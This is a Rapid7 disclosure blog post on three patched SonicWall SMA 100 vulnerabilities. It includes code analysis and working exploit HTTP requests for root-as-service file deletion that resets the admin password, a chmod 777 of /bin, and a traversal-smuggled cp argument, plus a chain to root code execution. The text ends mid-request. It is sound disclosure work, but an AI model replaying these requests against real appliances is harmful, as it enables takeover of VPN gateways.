# Multiple Vulnerabilities in SonicWall SMA 100 Series (FIXED) | Rapid7 Blog

- **Source :** rapid7
- **URL :** https://www.rapid7.com/blog/post/2025/05/07/multiple-vulnerabilities-in-sonicwall-sma-100-series-2025/
- **Date :** 2025-06-02

---

## Overview

In April of 2025, Rapid7 discovered and disclosed three new vulnerabilities affecting SonicWall Secure Mobile Access (“SMA”) 100 series appliances (SMA 200, 210, 400, 410, 500v). These vulnerabilities are tracked as CVE-2025-32819, CVE-2025-32820, and CVE-2025-32821. An attacker with access to an SMA SSLVPN user account can chain these vulnerabilities to make a sensitive system directory writable, elevate their privileges to SMA administrator, and write an executable file to a system directory. This chain results in root-level remote code execution. These vulnerabilities have been fixed in version [10.2.1.15-81sv](https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0011).

Rapid7 would like to thank the SonicWall security team for quickly responding to our disclosure and going above and beyond over a holiday weekend to get a patch out.

## Vulnerability table

CVE| Description| Affected Service| CVSS  
---|---|---|---  
CVE-2025-32819| An authenticated attacker with user privileges can delete any file on the SMA appliance as root to perform privilege escalation to the administrator account. _Based on known (private) IOCs and Rapid7 incident response investigations, we believe this vulnerability may have been used in the wild._|  HTTP (Port 80), HTTPS (Port 443)| [8.8 (High)](https://www.first.org/cvss/calculator/3-0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)  
CVE-2025-32820| An authenticated attacker with user privileges can inject a path traversal sequence to make any directory on the SMA appliance writable by all users, including the nobody user. Any existing file on the system can also be overwritten with junk contents as root.| HTTP (Port 80), HTTPS (Port 443)| [8.3 (High)](https://www.first.org/cvss/calculator/3-0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H)  
CVE-2025-32821| An authenticated attacker with administrator privileges can inject shell command arguments to upload a fully controlled file anywhere that the nobody user can write to.| HTTP (Port 80), HTTPS (Port 443)| [6.7 (Medium)](https://www.first.org/cvss/calculator/3-0#CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:H/A:H)  
  
## Credit

These vulnerabilities were discovered by Ryan Emmons, Staff Security Researcher at Rapid7, and are being disclosed in accordance with Rapid7’s [coordinated vulnerability disclosure policy](/security/disclosure/).

## Remediation

To remediate CVE-2025-32819, CVE-2025-32820, and CVE-2025-32821, SonicWall SMA administrators should update to the latest version, 10.2.1.15-81sv. For additional information, please see SonicWall’s [advisory](https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0011).

## Rapid7 customers

InsightVM and Nexpose customers will be able to assess their exposure to CVE-2025-32819, CVE-2025-32820, and CVE-2025-32821 with an unauthenticated vulnerability check expected to be available in today’s (May 7) content release.

## Analysis

The appliance tested was ”SMA 500v for ESXi” running version 10.2.1.14-75sv, the latest available at the time of research.

![blog-sonicwall-1.png](https://www.rapid7.com/cdn/images/bltd09d086d1deaccea/68497c694799487995ba409a/blog-sonicwall-1.png)

### CVE-2025-32819

An attacker with access to a low-privilege SMA user account can delete any file as root. This vulnerability appears to be a patch bypass for a previously reported arbitrary file delete vulnerability. That original vulnerability was [disclosed by NCC Group in 2021](https://www.nccgroup.com/us/research-blog/technical-advisory-sonicwall-sma-100-series-unauthenticated-arbitrary-file-deletion/), and a patch was previously released in the 10.2.0.9-41sv and 10.2.1.3-27sv patch cycle. Rapid7 is not aware of any specific CVE assigned to this original vulnerability; the NCC Group blog post states that a CVE was not shared with them, and we didn’t see a clear 1:1 match on the SonicWall PSIRT page.

Based on our testing, the unauthenticated arbitrary file delete vulnerability disclosed by NCC Group was patched by adding an authentication check. However, that authentication check is satisfied with a valid low-privilege session cookie, so exploitation is still viable. An attacker can exploit this vulnerability with low privileges to elevate to SMA administrator. This can be chained with CVE-2025-32820 and CVE-2025-32821 to establish root-level remote code execution on the SMA research target running 10.2.1.14-75sv. _Note: Based on known (private) IOCs and Rapid7 incident response investigations, we believe this vulnerability may have been used in the wild._

In /usr/src/EasyAccess/www/conf/httpd.conf, we observe that the /fileshare/sonicfiles web path is mapped to the sonicfiles.py Flask application.
    
    
    WSGIScriptAliasMatch ^/fileshare/sonicfiles /usr/src/EasyAccess/www/python/sonicfiles/sonicfiles.py
    WSGIScriptAliasMatch ^/report    /usr/src/EasyAccess/www/python/sonicfiles/report.py
    WSGIScriptAliasMatch ^/threat/__api__/v1 /usr/src/EasyAccess/www/python/authentication_api/threat_api.py
    

Within sonicfiles.py, we find the function main_handler, which is a main function that enforces authentication checks and dispatches various “RacNumber” SMB operations. At [A], we see an authorization check being performed before the primary API functionality is reachable.
    
    
    @application.route('/sonicfiles', methods=['GET', 'POST']) 
    @application.route('/', methods=['GET', 'POST'])
    def main_handler():
    
        #Get the required config if its not set
        #application.get_config()
        prog = 'fileexplorer'
    
        '''Alternate method for CSRF
    
        referrer = request.referrer
        parsed_referrer = urlparse(request.referrer)
        if((referrer is None) or (parsed_referrer.hostname != request.host)):
            print("Referrer something is wrong")
            return HttpErrorCode["NOT_PERMITTED_AUTH"]
        '''
    
        #set the log level to Debug when don't get the setting from SMA settings.
        application.set_log_level(logging.DEBUG)
    
        authResult = application.authorizationCheck() # [A]
        if authResult:
            response = make_response(str(HttpErrorCode["NOT_PERMITTED_AUTH"][0])) 
            response.headers['content-type'] = 'text/plain'
            response.headers['Cache-Control'] = 'no-cache'
            logger.info("::SONICFILES:: Authorization check failed {}".format(authResult))
            return response, HttpErrorCode["NOT_PERMITTED_AUTH"][1]
    
        racNum = request.args.get('RacNumber', RacNumber.RAC_INVALID, int)
        if racNum is RacNumber.RAC_INVALID:
            return 'Invalid invocation', 500 
    
        smbshare = FileShare(application)
    [..SNIP..]
    

Let’s investigate what application.authorizationCheck is. It’s defined in pythonApi.py:
    
    
     def authorizationCheck(self):
            return self.api.authorizationCheck(self.get_connection_id(), request.method, request.args.get('swcctn'))
    

The self.get_connection_id function is depicted below. It fetches the swap cookie ([B]), which is the primary session cookie, then decodes it as base64 ([C]) and returns it.
    
    
      @staticmethod
        def get_connection_id():
            if (SONICFILES_UNIT_TEST_MODE):
                #connection = request.args.get('sessionid', "", string)
                sessionid = request.args.get('sessionid')
                connection = base64.b64decode(sessionid).decode('utf-8')
                print(connection)
                return connection
    
            swap = request.cookies.get("swap") # [B]
            if swap == None:
                return ""
    
            connection = base64.b64decode(swap).decode('utf-8') # [C]
            mask_connection = connection.replace(connection[4:-4], (len(connection)-8) * '*') # abcd***...***ABCD
            logger.debug("::SONICFILES:: session {}".format(mask_connection))
            return connection
    

Since the primary authorizationCheck function is a [SWIG](https://www.swig.org/) function implemented in native code, the decompiled cleaned up C for that is depicted below. It calls sessionGetAndRefresh ([D]), which queries the web application’s SQLite primary database on disk, to determine whether the provided session is an authenticated one. If it’s valid (and if the CSRF token matches when the ‘POST’ method is used), it returns a success code ([E]).
    
    
    0001b2e0    int32_t authorizationCheck(int32_t sessionId, char* method, int32_t swcctn)
    
    0001b2e0    {
    0001b2e0        int32_t currentSessionId = sessionId;
    0001b315        int32_t sessionHandle = sessionGetAndRefresh(dbhGet(0), currentSessionId); // [D]
    0001b31a        bool match = !sessionHandle;
    0001b31a        
    0001b31e        if (!sessionHandle)
    0001b37b            return -1;
    0001b37b        
    0001b320        char* methodPointer = method;
    0001b324        int32_t compareChars = 5;
    0001b329        char const* const compareStr = "POST";
    0001b329        
    0001b32f        while (compareChars)
    0001b32f        {
    0001b32f            char mChar = *(uint8_t*)methodPointer;
    0001b32f            char const compareChar = *(uint8_t*)compareStr;
    0001b32f            match = mChar == compareChar;
    0001b32f            methodPointer = &methodPointer[1];
    0001b32f            compareStr = &compareStr[1];
    0001b32f            compareChars -= 1;
    0001b32f            
    0001b32f            if (mChar != compareChar)
    0001b32f                break;
    0001b32f        }
    0001b32f        
    0001b331        if (match)
    0001b331        {
    0001b35f            currentSessionId = swcctn;
    0001b35f            
    0001b36a            if (doCSRFCheckForCgi(sessionHandle, currentSessionId))
    0001b36a            {
    0001b36f                sessionFree(sessionHandle);
    0001b374                return -2;
    0001b36a            }
    0001b331        }
    0001b331        
    0001b336        sessionFree(sessionHandle, currentSessionId);
    0001b33b        return 0; // [E]
    0001b2e0    }
    

That establishes that any low-privileged user can call RacNumber functions via the sonicfiles API. In 2021, [NCC Group outlined](https://www.nccgroup.com/us/research-blog/technical-advisory-sonicwall-sma-100-series-unauthenticated-arbitrary-file-deletion/) how the RAC_DOWNLOAD_TAR function (RacNumber=44) could be exploited with a path traversal for privileged arbitrary file deletion. That download_tar code does not appear to have been modified from what the NCC Group blog post shows, since the “/tmp” directory string is still unsafely concatenated with tainted web parameters ([F]); only the authentication check outlined above in main_handler appears to have been implemented as a fix.
    
    
      def download_tar(self, partialCmd):
            arg1 = self.get_decoded_url('Arg1')
            foldername = request.args.get('Arg2')
            timestamp = request.args.get('timestamp')
            list_file_path = None
                
            cmd_list = partialCmd.split()
            cmd_list.append(arg1)
            cmd_list.append(foldername)
            cmd_list.append("stdout")
            #appending verbose
    
            logger.debug("{} download_tar:: cmd_list: {}, timestamp {}".format(SONICFILES, cmd_list, timestamp))
    
            if timestamp is not None:
                swcctn = request.args.get('swcctn')
                list_file_path = '/tmp/' + swcctn + '_' + timestamp # [F]
                cmd_list.append(list_file_path)
    
            self.get_cred(cmd_list,arg1)#Appends cred to the list
            current_time = datetime.datetime.now().time()
            logger.debug("{} Download Start time : {}".format(SONICFILES, current_time.isoformat()))
    		
            cmd_bytes_list = str_list_to_uft8_bytes_list(cmd_list)
            downloadsubprocess = subprocess.Popen(cmd_bytes_list,stdout=subprocess.PIPE,shell=False)
    [..SNIP..]
    

#### Exploitation

We’ll start by creating a user named lowpriv with low user-level SMA privileges. This user account should not have access to any administrative functionality, and it will act as our victim account for exploitation. We’ll login to the SMA web service listening on port 443 and establish that we have access to this standard user account.

![blog-sonicwall-2.png](https://www.rapid7.com/cdn/images/bltf013641e653f8216/68497cebb037915ebe2b618b/blog-sonicwall-2.png)

We’ll create two attacker-owned files as root to demonstrate the privileged arbitrary file delete.

![blog-sonicwall-3.png](https://www.rapid7.com/cdn/images/bltda5a36aa53bab557/68497d0ab03791317c2b618f/blog-sonicwall-3.png)

Next, we’ll grab our lowpriv user’s session cookies and use them to perform the malicious file delete web request. The server will return a generic 500 code error response.
    
    
    GET /fileshare/sonicfiles/?User=admin&Pass=null&Domn=&RacNumber=44&Arg1=smb://192.168.200.1/test/&Arg2=null&swcctn=../usr/src/EasyAccess/www/python/authentication&timestamp=api/../../../../../../tmp/rootfile HTTP/1.1
    Host: 192.168.181.150
    Cookie: swap="MHo5dTZvQkNRcXhVWDVpMFo1MktCRGZmYkZjSE9CZm1FUU9QOWdUek5BZz0="; swcctn=JKUKl0KiKYX5Kf4nY7700B4lb5N7M1PD
    Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Windows"
    Accept-Language: en-US,en;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate, br
    Priority: u=0, i
    Connection: keep-alive
    

With our console root shell, we can see that the root-owned /tmp/rootfile file has been deleted.

![blog-sonicwall-4.png](https://www.rapid7.com/cdn/images/bltcfbf1b6b5fc46cf6/68497d89af183099d1e6ed2b/blog-sonicwall-4.png)

This can be leveraged to delete the /etc/EasyAccess/var/conf/persist.db file, which is the primary web server SQLite database. When that happens, the system will reboot and reset the SMA administrator password to “password”. Based on known (private) IOCs and Rapid7 incident response investigations, we believe that this specific technique may have been used in the wild.

### CVE-2025-32820

An authenticated attacker with user-level low privileges can inject a path traversal sequence to an arbitrary directory on the SMA appliance to make it world-writable. This can be chained with CVE-2025-32819 and CVE-2025-32821 to establish root-level remote code execution on the SMA research target running 10.2.1.14-75sv. Additionally, if a file path is provided, any existing file on the system can be overwritten with junk contents as root, creating a persistent denial of service condition.

Let’s investigate this now. In authentication_api/client/__init__.py, we observe authentication checks implemented in before_request ([G]).
    
    
    @application.before_request
    def before_request():
        logLevl = Logger.getLogLevel()
        application.logger.setLevel(logLevl)
        current_app.logger.info("{} {}".format(request.method, request.script_root + request.path))
        Authorize.authorization_check(request, current_app.logger, False) # [G]
    

This authorization_check function is similar to the one we previously looked at. However, this function is implemented in Python, within smaauthorize.py, instead of in a C shared library. Below, we can see this logic. The third parameter is called requireAdmin, and it defaults to True ([H]). In this case, though, the call within before_request explicitly states that low-privilege users should be allowed via the False parameter input. The authorization code queries the primary web SQLite database to determine whether the user’s swap session cookie exists in the database ([I]). If so, the request will succeed.
    
    
      @staticmethod
        def authorization_check(request, logger, requireAdmin = True): # [H]
            if (API_UNIT_TEST_MODE):
                return
    
            sessionId = request.cookies.get(AP_COOKIE_NAME)
    
            if (sessionId == None):
                logger.info("Login failed. No valid sessionId from cookie.")
                raise Unauthorized(AUTHORIZE_FAIL)
    
            temp_db_session = Session()
            sessionId_decoded = base64.b64decode(sessionId).decode()
            sslvpn_session = temp_db_session.query(SmaSession).filter(SmaSession.sessionId == sessionId_decoded).first() # [I]
            if (sslvpn_session == None):
                temp_db_session.close()
                logger.info("Login failed. No valid session. sessionId = {}, sessionId_decoded = {}".format(sessionId, sessionId_decoded))
                raise Unauthorized(AUTHORIZE_FAIL)
    
            # touch session
            sslvpn_session.activityTimestamp = int(time.time())
            temp_db_session.commit()
            temp_db_session.refresh(sslvpn_session)
            temp_db_session.close()
    
            # authorization check
            Authorize.sessionStatusCheck(logger, sslvpn_session)
            Authorize.userTypeCheck(logger, requireAdmin, sslvpn_session)
            Authorize.CSRFTokenCheck(logger, requireAdmin, sslvpn_session)
    

There are a few different API endpoints that can be reached as our low-privilege user. That list is depicted below:
    
    
    clientApi.add_resource(NxDisconnectInfoResource, '/nxdisconnectinformation')
    clientApi.add_resource(NxPostConnectionScriptResource, '/nxpostconnectionscript')
    clientApi.add_resource(NxPostConnectionScriptFileResource, '/nxpostconnectionscript/file')
    clientApi.add_resource(NxVersionResource, '/nxversion')
    clientApi.add_resource(VpnParametersResource, '/vpnparameters')
    clientApi.add_resource(SessionStatusResource, '/sessionstatus')
    clientApi.add_resource(AlwaysOnResource, '/alwayson')
    clientApi.add_resource(RecurringEpcProfileResource, '/recurringepcprofile')
    clientApi.add_resource(BookmarkDetailListResource, '/bookmarkdetails')
    clientApi.add_resource(ConnectionProxyResource, '/connectionproxy')
    clientApi.add_resource(AdLogonScriptResource, '/adlogonscript')
    

The NxPostConnectionScriptFileResource endpoint sounds promising, since it deals with file operations. Within nxpostconnectionscript.py, we find the API endpoint logic for POST requests. A file input parameter called upfile is expected ([J]). A sanitized file name is extracted using [secure_filename](https://tedboy.github.io/flask/generated/werkzeug.secure_filename.html) (to prevent path traversal) and assigned to the tmp_file variable ([K]). Then, the file contents are stored in tmp_file’s location. A file operation command is also executed using os.system, with the tmp_file argument sanitized using [shlex.quote](https://docs.python.org/3/library/shlex.html#shlex.quote) to prevent command injection ([L]).

This is all handled well. However, while the tmp_file path was created safely, the application later needs to reference just the file name without the prepended /tmp directory. In order to do so, it defines a new filePath variable by directly concatenating the unsanitized file.filename string with a different directory path ([M]). This is then wrapped in shlex.quote, appended to the string “chmod 777 ”, and executed using os.system ([N]). No command injection is possible, since the command string is appropriately escaped. Despite this, shlex.quote does not remove path traversal sequences, so a relative traversal file name can be supplied by the attacker to execute “chmod 777” as root on any path of the attacker’s choosing.
    
    
       @swagger.doc(postDocument)
        def post(self):
            post_reqparser = reqparse.RequestParser()
            post_reqparser.add_argument('upfile', required = True, type = FileStorage, location = 'files') # [J]
            args = post_reqparser.parse_args()
    
            [..SNIP..]
    
            # store file in /tmp for examination
            file = request.files['upfile']
            tmp_file = '/tmp/' + secure_filename(file.filename) # [K]
            file.save(tmp_file)
    
            fileSize = os.stat(tmp_file).st_size
            if (fileSize > smaApi.MAX_SCRIPT_FILE_LEN or fileSize == 0):
                cmd = "rm -rf {}".format(shlex.quote(tmp_file)) # [L]
                os.system(cmd)
                raise BadRequest(getMessage(API_ERR_CODE_CLIENT_FILE_SIZE_INVALID).format(int(smaApi.MAX_SCRIPT_FILE_LEN / 1024)))
    
            # check dir exists or not and if not create it
            if (not os.path.exists(smaApi.POST_SCRIPTS_DIR)):
                cmd = "mkdir {}; chmod 777 {}".format(shlex.quote(smaApi.POST_SCRIPTS_DIR), shlex.quote(smaApi.POST_SCRIPTS_DIR))
                os.system(cmd)
            
            if (not os.path.exists(smaApi.POST_SCRIPTS_DESC_DIR)):
                cmd = "mkdir {}; chmod 777 {}".format(shlex.quote(smaApi.POST_SCRIPTS_DESC_DIR), shlex.quote(smaApi.POST_SCRIPTS_DESC_DIR))
                os.system(cmd)
    
            # move file to its destination
            cmd = "mv {} {}".format(shlex.quote(tmp_file), shlex.quote(smaApi.POST_SCRIPTS_DIR))
            os.system(cmd)
            filePath = smaApi.POST_SCRIPTS_DIR + '/' + file.filename # [M]
            cmd = "chmod 777 {}".format(shlex.quote(filePath)) # [N]
            os.system(cmd)
    [..SNIP..]
    

#### Exploitation

This is a niche primitive, since we do not control the command being executed. Fortunately, making any directory world-writable is exactly what we need to weaponize CVE-2025-32821, our arbitrary low-privilege file write as nobody. We’ll perform a web request to the vulnerable API endpoint as the lowpriv user. In that request, we’ll set upfile to a relative traversal sequence into /bin, which is on the root user’s PATH.
    
    
    POST /__api__/v1/client/nxpostconnectionscript/file HTTP/1.1
    Host: 192.168.181.150
    Cookie: swap="MUZTMTExT29UVW1UZ0p2aURTQThWYzlLTmV3TEp3dGR5a0FzR3h6aEY2RT0="; swcctn=kg02nQOWI0JEdgI9OyK4i2EJyvP0Zfy0
    Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Windows"
    Accept-Language: en-US,en;q=0.9
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIpPybfdplJ1hIwzq
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate, br
    Priority: u=0, i
    Connection: keep-alive
    Content-Length: 213
    
    ------WebKitFormBoundaryIpPybfdplJ1hIwzq
    Content-Disposition: form-data; name="upfile"; filename="../../../../../../../../../bin/"
    
    01
    ------WebKitFormBoundaryIpPybfdplJ1hIwzq--
    

Our pspy monitor logs two commands being executed as root. The first command’s file path is sanitized using secure_filename, but the second is only sanitized using shlex.quote, resulting in a traversal to /bin.
    
    
    CMD: UID=0     PID=15082  | sh -c mv /tmp/bin /usr/src/EasyAccess/var/conf/postscripts
    CMD: UID=0     PID=15083  | sh -c chmod 777 /usr/src/EasyAccess/var/conf/postscripts/../../../../../../../../../bin/
    

Exploitation is confirmed with our console root shell, which shows that the /bin directory is now world-writable.

###  ![blog-sonicwall-5.png](https://www.rapid7.com/cdn/images/bltc8c48d3ccb590f5c/68497de045f69a3c399397d4/blog-sonicwall-5.png)

### CVE-2025-32821

An authenticated attacker with administrator privileges can inject shell command arguments with an escape sequence to upload a fully controlled file anywhere that the nobody user can write to. This can be chained with CVE-2025-32820 to establish root-level remote code execution on the SMA research target running 10.2.1.14-75sv. It’s also possible to copy existing files that the nobody user can read, such as /etc/passwd or the application’s SQLite database, to the web root directory for data exfiltration.

We’ll start by taking a look at the main function in /cgi-bin/importlogo.

After confirming the user is an authenticated administrator and the HTTP method is “POST”, the application checks for the presence of an integer parameter called updateFavicon ([O]). If this is set to “1”, and if the defaultFavicon parameter is “0”, the application will call FUN_0804a0f0 with the first argument set to a FILE pointer from the multipart form file parameter called favicon1 ([P]). After confirming some basic validation checks, such as file size, the FUN_0804a0f0 function will write the uploaded file to disk at /usr/src/EasyAccess/www/htdocs/themes/favicon1.ico. Next, the portalName POST parameter is fetched and passed through safeSystemCmdArg2 ([Q]). This is a security function that searches for command injection characters, such as $, \n, ;, |, <, >, ^, and `. If any of those characters are detected, the function will return a truncated string of the characters up to that point. Then, a format string is created with the sanitized portalName value to craft the shell command string cp -f /usr/src/EasyAccess/www/htdocs/themes/favicon1.ico /usr/src/EasyAccess/uiaddon/{portalName_VALUE}/favicon.ico ([R]) and the command is executed via system_s_quiet ([S]), which is a wrapper for system that runs in the context of nobody.
    
    
    [..SNIP..]
      if (initCgi() < 0) {
        return -1;
      }
    
      getCookie("swap",cookieBuffer);
    
      initClientApi();
      cspInit();
    
      reqMethod = (char *)gcgiFetchEnvVar(4);
      uVar9 = dbhGet(0);
    
      sessionHandle = sessionGetAndRefresh(uVar9,cookieBuffer);
    
      if (sessionHandle == 0) {
        gcgiSendStatus(401);
        return 0;
      }
      respJson = cJSON_CreateObject();
      messageJsonArray = cJSON_CreateArray();
    
      if ((respJson == 0) || (messageJsonArray = 0)) {
        return 0;
      }
    
      maybeResult = userRolePermissionCheck(sessionHandle,reqMethod);
      if (maybeResult == 1) {
        pcVar5 = "You have no permission to view this page";
    
    LAB_0804948a:
        addWarningMessage(messageJsonArray,"error",pcVar5);
      }
      else {
        if (maybeResult == 2) {
          pcVar5 = "Read-only administrator";
          goto LAB_0804948a;
        }
    
        if (maybeResult == 0) {
          maybeResult = strcmp(reqMethod,"POST");
    
          if (maybeResult != 0) goto LAB_080493e8;
    
          if (doCSRFTokenCheck(sessionHandle) != 1) {
            exit(-1);
          }
    
          setuid(0);
          setgid(0);
          seteuid(0);
          setegid(0);
          
          gcgiFetchInteger("updateFavicon",&updateFaviconFlag,0);
          
          if (updateFaviconFlag == 1) { // [O]
            maybeResult = gcgiFetchInteger("defaultFavicon",&useDefaultFavicon,0);
            bVar1 = nullptr;
    
            if (useDefaultFavicon == 0) {
              maybeResult = FUN_0804a0f0("favicon1","favicon1.ico",maybeResult); // [P]
              bVar1 = 0 < maybeResult;
            }
    
            maybeResult = gcgiFetchString("portalName",portalNameBuffer,0x80);
    
            if (maybeResult == 0) {
              if (useDefaultFavicon == 0) { 
                if (bVar1) {
                  uVar9 = safeSystemCmdArg2(portalNameBuffer,"-"); // [Q]
                  baseInstallDir = "/usr/src/EasyAccess";
                  __snprintf_chk(pcVar5,0x180,1,0x180,
                                 "cp -f %s/www/htdocs/themes/favicon1.ico %s/uiaddon/%s/favicon.ico",
                               "/usr/src/EasyAccess","/usr/src/EasyAccess",uVar9,"/usr/src/EasyAccess"
                                ); // [R]
                  system_s_quiet(pcVar5); // [S]
    [..SNIP..]
    

Note that the provided portal name is not validated as a legitimate web portal name at any point in the code path thus far–it’s checked against valid portal names if updateFavicon is not set. So, we don’t need to provide a valid portal name. Additionally, although the portal name is sanitized for command injection characters, it is not sanitized for path traversals, it is not URL encoded, and hash symbols are not truncated. As a result, an attacker can provide a portalName value with a traversal sequence to a different file path, followed by a space and a hash symbol to escape “/favicon.ico”.

The result is that the attacker can upload their own fully controlled file and exploit the limited command injection to write it with any file name they’d like to any directory that nobody can write to.

#### Exploitation

We can perform the web request depicted below to exploit this arbitrary file write.
    
    
    POST /cgi-bin/importlogo HTTP/1.1
    Host: 192.168.181.150
    Cookie: ajaxUpdates=OFF; swap="NVlSSVc1MVdtb0syYWFybFdUdHFEcG9hRjZpMWlyaThlY0FmdlNQRlRhOD0="; swcctn=aXJANYBXJMy46YLSIApSwSoRIWkYRkR5
    Content-Length: 554
    Sec-Ch-Ua-Platform: "Windows"
    X-Csrf-Token: aXJANYBXJMy46YLSIApSwSoRIWkYRkR5
    Accept-Language: en-US,en;q=0.9
    Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
    Sec-Ch-Ua-Mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXOj6BtGNhEubdWvN
    Origin: https://192.168.181.152
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://192.168.181.152/
    Accept-Encoding: gzip, deflate, br
    Priority: u=1, i
    Connection: keep-alive
    
    ------WebKitFormBoundaryXOj6BtGNhEubdWvN
    Content-Disposition: form-data; name="portalName"
    
    ../../../../../../usr/src/EasyAccess/www/htdocs/test.txt #
    ------WebKitFormBoundaryXOj6BtGNhEubdWvN
    Content-Disposition: form-data; name="defaultFavicon"
    
    0
    ------WebKitFormBoundaryXOj6BtGNhEubdWvN
    Content-Disposition: form-data; name="updateFavicon"
    
    1
    ------WebKitFormBoundaryXOj6BtGNhEubdWvN
    Content-Disposition: form-data; name="favicon1"; filename="TESTING.gif"
    Content-Type: image/gif
    
    CONTENT
    ------WebKitFormBoundaryXOj6BtGNhEubdWvN--
    

Our pspy monitor logs the following command being executed as UID 99 (nobody).
    
    
    2025/05/01 12:10:47 CMD: UID=99    PID=3243   | sh -c cp -f /usr/src/EasyAccess/www/htdocs/themes/favicon1.ico /usr/src/EasyAccess/uiaddon/../../../../../../usr/src/EasyAccess/www/htdocs/test.txt #/favicon.ico 2>/dev/null
    

As expected, the test.txt file has been written to the web root.

![blog-sonicwall.png](https://www.rapid7.com/cdn/images/blt2b9f2c209b7e280f/68497e4f2fcbad401c66429f/blog-sonicwall.png)

We also note that the uploaded file has the executable bit set by default.
    
    
    # ls -lha /usr/src/EasyAccess/www/htdocs/test.txt
    -rwx------ 1 nobody nobody 7 May  1 12:10 /usr/src/EasyAccess/www/htdocs/test.txt
    

This detail is useful for exploitation, since it will facilitate easily writing an executable file to a directory on the root PATH for arbitrary remote code execution.

### Chained Impact

The vulnerabilities disclosed in this document permit an attacker with SMA SSLVPN low-privilege user credentials to perform the following five steps:

  1. Exploit CVE-2025-32819 to delete the primary SQLite database and reset the password of the default SMA admin user.
  2. Login as admin to the SMA web interface.
  3. Exploit CVE-2025-32820 to make the SMA appliance’s /bin directory world-writable.
  4. Exploit CVE-2025-32821 to write the file /bin/lsb_release. This executable is not installed by default, but we observed that an automated job on the appliance routinely attempts to execute it as root every few minutes.
  5. Wait for sh -c lsb_release to be executed automatically. When this happens, the attacker gains root-level remote code execution on the SMA device.



#### Demonstration

We’ll start by grabbing our low-privilege user’s cookies in our “assumed breach” scenario. This cookie string is swap="ZHNZZThVdlJzWHY1MkpWTDM0akFjbG9XWFgyd29Hdk1yVEtPZWdzSnJlbz0="; swcctn=LEj9kOzEjYibGOSEW9YE8ElgWwiOgigN.

![blog-sonicwall-8.png](https://www.rapid7.com/cdn/images/blt80e7a41e6852c46b/68497e7176d3246a8a38a4fd/blog-sonicwall-8.png)

Now, let’s reset the administrator’s password by exploiting CVE-2025-32819 and deleting the primary SQLite database. The SMA returns a 200 status with no body.
    
    
    GET /fileshare/sonicfiles/?User=admin&Pass=null&Domn=&RacNumber=44&Arg1=smb://192.168.200.1/test/&Arg2=null&swcctn=../usr/src/EasyAccess/www/python/authentication&timestamp=api/../../../../../../usr/src/EasyAccess/var/conf/persist.db HTTP/1.1
    Host: 192.168.181.150
    Cookie: swap="ZHNZZThVdlJzWHY1MkpWTDM0akFjbG9XWFgyd29Hdk1yVEtPZWdzSnJlbz0="; swcctn=LEj9kOzEjYibGOSEW9YE8ElgWwiOgigN
    Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Windows"
    Accept-Language: en-US,en;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate, br
    Priority: u=0, i
    Connection: keep-alive
    

Refreshing the web page confirms it worked, though the application is not thrilled with our decision.

![blog-sonicwall-9.png](https://www.rapid7.com/cdn/images/bltecbbf9920a3aaf3a/68497ee62fcbad1ef86642b3/blog-sonicwall-9.png)

After a few seconds, the watchdog has had enough and the device is rebooted. When we refresh the page a couple of minutes later, things are looking as good as new.

![blog-sonicwall-10.png](https://www.rapid7.com/cdn/images/bltebbb3ccbe5ad0cc4/68497f06209a6a4497fcf79b/blog-sonicwall-10.png)

After logging in using the credentials admin:password, we’re greeted with an end user product agreement, indicating that the device has been initialized.

![blog-sonicwall-11.png](https://www.rapid7.com/cdn/images/blt137968ae793ae788/68497f24498eb085f0acd5ad/blog-sonicwall-11.png)

We’ll input a free trial license key to get the device back in a functional state, though a real attacker would probably use a stolen one. Next, we’ll use our CVE-2025-32820 PoC to make /bin writable. The server should return a 500 error with the message “Failed to create description file.”
    
    
    POST /__api__/v1/client/nxpostconnectionscript/file HTTP/1.1
    Host: 192.168.181.150
    Cookie: swap="amZEMjA1cVYwNXRzWDFmcDgzcVhEb3NNM2hFMHE4a0FTOFZTQTlDeE1kaz0="; swcctn=bGhJ8EJ9GMmKG7d3MggEEgd8R59gyFSv
    Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Windows"
    Accept-Language: en-US,en;q=0.9
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIpPybfdplJ1hIwzq
    Upgrade-Insecure-Requests: 1
